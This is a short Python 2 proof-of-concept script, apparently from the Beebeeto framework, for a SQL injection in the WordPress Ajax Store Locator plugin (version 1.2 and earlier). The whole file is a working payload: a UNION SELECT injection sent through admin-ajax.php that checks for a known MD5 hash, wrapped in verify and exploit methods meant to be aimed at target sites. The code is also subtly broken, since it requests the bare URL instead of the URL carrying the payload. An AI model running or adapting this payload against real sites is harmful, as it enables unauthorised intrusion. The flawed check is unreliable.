#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0087',
            'name': 'Wordpress Ajax Store Locator <= 1.2 SQL注入漏洞 POC',
            'author': '1024',
            'create_date': '2015-04-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['<=1.2'],
            'type': 'SQL Injection',
            'tag': ['WordPress插件漏洞', '/wp-admin/admin-ajax.php', 'SQL Injection', 'php'],
            'desc': 'The "sl_dal_searchlocation_cbf" ajax function is affected from SQL Injection vulnerability',
            'references': ['https://www.exploit-db.com/exploits/36777/'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = ('wp-admin/admin-ajax.php?action=sl_dal_searchlocation&funMethod=SearchStore'
                   '&Location=Social&StoreLocation=1~1+UNION+SELECT+1,2,3,4,md5(233),6,7,8,9,10'
                   ',11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--')
        verify_url = url + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = requests.get(url).content
        if 'e165421110ba03099a1c0393373c5b43' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())